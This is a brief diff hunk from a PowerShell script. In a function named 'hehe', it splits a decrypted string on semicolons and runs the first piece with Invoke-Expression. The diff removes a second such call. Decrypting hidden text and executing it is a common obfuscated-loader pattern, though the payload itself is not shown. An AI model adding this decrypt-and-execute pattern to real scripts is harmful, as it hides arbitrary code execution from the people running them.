@@ -18,5 +18,4 @@ Function hehe {
 
     $DataArray = $DecryptedString.Split(';')
     Invoke-Expression $DataArray[0]
-    Invoke-Expression $DataArray[1]
 }
